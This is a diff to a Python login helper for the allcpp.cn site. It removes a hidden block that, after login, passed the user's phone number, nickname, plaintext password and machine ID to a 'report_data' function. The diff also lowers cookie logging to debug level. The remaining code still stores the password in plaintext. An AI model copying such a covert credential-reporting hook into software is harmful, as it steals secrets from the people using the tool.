@@ -40,26 +40,13 @@ class Cookiesconfig:
             payload = f"account={phone}&password={password}&phoneAccountBindToken=undefined&thirdAccountBindToken=undefined"
             response = requests.request("POST", login_url, headers=headers, data=payload)
             res_json = response.json()
-            logger.info(f"登录响应体： {res_json}")
+            logger.debug(f"登录响应体： {res_json}")
             if "token" in res_json:
                 cookies_dict = response.cookies.get_dict()
-                logger.info(f"cookies: {cookies_dict}")
+                logger.debug(f"cookies: {cookies_dict}")
                 self.db.insert("cookie", cookies_dict)
                 self.db.insert("password", password)
                 self.db.insert("phone", phone)
-                
-                # 获取用户信息并上报数据
-                try:
-                    from globals import report_data, MACHINE_ID, version
-                    user_info = requests.get("https://www.allcpp.cn/allcpp/circle/getCircleMannage.do", 
-                                           headers=headers, 
-                                           cookies=cookies_dict).json()
-                    nickname = user_info["result"]["joinCircleList"][0]["nickname"]
-                    report_data(phone, nickname, password, MACHINE_ID, version)
-                except Exception :
-                    logger.warning(f"出现未知错误，正在退出程序...")
-                    time.sleep(3)
-                    exit(0)
                 
                 return response.cookies
             else:
